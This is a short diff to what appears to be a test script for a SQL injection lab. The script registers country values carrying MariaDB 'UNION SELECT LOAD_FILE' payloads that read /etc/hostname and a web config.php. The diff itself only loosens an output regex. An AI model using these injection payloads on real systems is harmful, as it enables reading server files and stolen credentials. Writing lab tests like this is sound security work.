@@ -52,7 +52,7 @@ print("PASS: stored country later evaluated by a real MariaDB UNION SELECT", flu
 
 read = register("Belgium' UNION SELECT LOAD_FILE('/etc/hostname')-- -")
 assert "Other Players In Belgium" in read
-assert re.search(r"<li>[0-9a-f]{12}</li>", read)
+assert re.search(r"<li>[0-9a-f]{12}\s*</li>", read)
 print("PASS: native MariaDB FILE permission reads a real non-secret OS file", flush=True)
 
 source = register("Belgium' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -")
